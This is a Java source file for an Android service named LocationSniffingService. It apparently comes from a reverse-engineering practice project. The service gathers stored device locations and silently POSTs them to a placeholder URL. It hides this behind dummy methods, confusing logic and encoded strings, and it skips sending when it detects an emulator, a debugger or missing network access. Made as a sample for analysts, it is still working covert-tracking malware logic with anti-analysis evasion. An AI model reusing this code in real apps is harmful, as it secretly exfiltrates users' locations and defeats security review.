package com.woop.tryreverseengineerthis.service;
import android.annotation.TargetApi;
import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Debug;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import com.woop.tryreverseengineerthis.helper.StringHelper;
import com.woop.tryreverseengineerthis.storage.LocationStorage;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.InvalidKeyException;
import java.util.List;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;

/**
 * Every x seconds, send all the location collected with a POST call to a URL
 *
 * Created by Jay on 3/29/2016.
 */
public class LocationSniffingService extends Service{

    private final static String TAG = "LocationSniffingService";

    private static Handler mHandler;

    @Override
    public IBinder onBind(Intent intent) {

        Log.d(TAG, "Starting handler");

        if(mHandler != null){
            mHandler = new Handler();
            int delay = 5;

            //Path Obfuscation
            mHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if(thisDoesnotDoAnything())
                        return;
                    else
                        thisAlsoDoesnotDoAnything();
                }
            }, delay);
        }
        return null;
    }

    //Starts the handler which will post every delay seconds
    @Override
    public void onCreate(){
    }

    private void thisAlsoDoesnotDoAnything(){

    }

    //Concats all the locations to send
    private boolean sendQuietly() {

        List<Location> locations = LocationStorage.getAllLocation();
        StringBuilder builder = new StringBuilder();
        for(Location loc : locations){
            builder.append(loc.getAltitude());
            builder.append(",");
            builder.append(loc.getLatitude());
            builder.append(",");
            builder.append(loc.getLongitude());
            builder.append(",");
            builder.append(loc.getTime());
            builder.append(",");
            builder.append("||");
        }

        actualSend(builder.toString());

        //Logic Obfuscation
        return builder.length() > 2 ? false : (builder.equals(builder) ? true : false);
    }

    @TargetApi(Build.VERSION_CODES.KITKAT)
    private void actualSend(String s) {
        try {
            URL url = new URL("toBeChanged");
            byte[] postData = s.getBytes(StandardCharsets.UTF_8);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setInstanceFollowRedirects(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Content-Length", Integer.toString(postData.length));
            connection.setUseCaches(false);
            try(DataOutputStream wr = new DataOutputStream(connection.getOutputStream())){
                wr.write(postData);
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
            return;
        } catch (IOException e) {
            e.printStackTrace();
            return;
        } catch (Exception e){
            e.printStackTrace();
            return;
        }
        Log.d(TAG, "Sent");
    }

    //Dummy method - b does not mean anything
    private boolean thisDoesnotDoAnything(){
        Log.d(TAG,"Checking...");
        boolean b = false;

        if (isValid())
            b = sendQuietly();

        Log.d(TAG, isValid() + "");

        return (b^=b) ? (b == b)^(b) : (b^b^b^b);
    }

    //Check if the environment is an emulated environment - just in case it is being analysed
    private boolean isValid(){

        Log.d(TAG, "Check if valid");

        String generic = "OnceUponATime";
        String unknown = "LivedABunnyCalled";
        String googlesdk = "Judy.SheWasGoingTo";
        String emulator = "OoposN10earlyforGot";
        String androidsdk86 = "beTheBestCopIn";
        String genymotion = "Zo0o0o0o0Topia";
        String sdk = "SheDidNotRealise";
        String sdk86 = "however,ThatShe";
        String vbox = "wasJustGoingtobe";
        String goldfish = "amereparkingWarden";
        String android = "sadfacebunny";

        String fingerprint = "T05FMTExMTExMTExMQ==";
        String model = "VFdPMjIyMjIyMjIyMg==";
        String manufacturer = "VEhSRUUzMzMzMzMzMw==";
        String product = "Rk9VUjQ0NDQ0NDQ0NA==";
        String hardware = "RklWRTU1NTU1NTU1NQ==";
        String telephonyservice = "U0lYNjY2NjY2NjY2Ng==";
        String connectivityservice = "U0lYNjY2NjY2NjY2Ng==";
        String locationservice = "RUlHSFQ4ODg4ODg4OA==";
        String gpsprovider = "TklORTk5OTk5OTk5OQ==";
        String networkprovider = "VEVOMDAwMDAwMDAwMA==";
        String telephoneoperator = "RUxWRU4xMTExMTExMQ==";

        try{
            generic = StringHelper.getStringStatic(generic);
            unknown = StringHelper.getStringStatic(unknown);
            googlesdk = StringHelper.getStringStatic(googlesdk);
            emulator = StringHelper.getStringStatic(emulator);
            androidsdk86 = StringHelper.getStringStatic(androidsdk86);
            genymotion = StringHelper.getStringStatic(genymotion);
            sdk = StringHelper.getStringStatic(sdk);
            sdk86 = StringHelper.getStringStatic(sdk86);
            vbox = StringHelper.getStringStatic(vbox);
            goldfish = StringHelper.getStringStatic(goldfish);
            android = StringHelper.getStringStatic(android);

            fingerprint = StringHelper.getStringDynamic(fingerprint);
            model = StringHelper.getStringDynamic(model);
            manufacturer = StringHelper.getStringDynamic(manufacturer);
            product = StringHelper.getStringDynamic(product);
            hardware = StringHelper.getStringDynamic(hardware);
            telephonyservice = StringHelper.getStringDynamic(telephonyservice);
            connectivityservice = StringHelper.getStringDynamic(connectivityservice);
            locationservice = StringHelper.getStringDynamic(locationservice);
            gpsprovider = StringHelper.getStringDynamic(gpsprovider);
            networkprovider = StringHelper.getStringDynamic(networkprovider);
            telephoneoperator = StringHelper.getStringDynamic(telephoneoperator);
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
            return false;
        } catch (BadPaddingException e) {
            e.printStackTrace();
            return false;
        } catch (InvalidKeyException e) {
            e.printStackTrace();
            return false;
        }

        //Check build's fingerprint
        Boolean checkFingerprint =  fingerprint.startsWith(generic) ||
                fingerprint.startsWith(unknown);

        //Check build's model
        Boolean checkModel =        model.contains(googlesdk) ||
                model.contains(emulator) ||
                model.contains(androidsdk86);

        //Check Manurfacturer for Genymotion (an emulation software)
        Boolean checkManufacturer = manufacturer.contains(genymotion) ||
                manufacturer.contains(unknown);

        //Check build's product
        Boolean checkProduct = product.contains(sdk) ||
                product.contains(vbox);

        //Check for goldfish hardware
        Boolean checkHardware = hardware.contains(goldfish) ||
                hardware.contains(vbox);

        //Return if any is detected
        if(checkFingerprint || checkModel || checkManufacturer || checkProduct || checkHardware)
            return false;

        //Check for telephone operator
        //Return if it is android
        if(android.equals(telephoneoperator))
            return false;

        //Return if debugger is connected
        if(Debug.isDebuggerConnected())
            return false;

        ConnectivityManager connectivityManager = (ConnectivityManager)
                getSystemService(connectivityservice);

        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();

        //Return if internet is not connected
        if(networkInfo == null || !(networkInfo.isConnected()))
            return false;


        LocationManager locationManager = (LocationManager)
                getSystemService(locationservice);

        boolean gps_enabled = false;
        boolean network_enabled = false;

        if(locationManager==null)
            locationManager = (LocationManager) this.getSystemService(locationservice);
        try{
            gps_enabled = locationManager.isProviderEnabled(gpsprovider);
        }catch(Exception ex){}
        try{
            network_enabled = locationManager.isProviderEnabled(networkprovider);
        }catch(Exception ex){}

        //If location service is not enabled don't bother
        if(!gps_enabled && !network_enabled)
            return false;

        return true;
    }

}
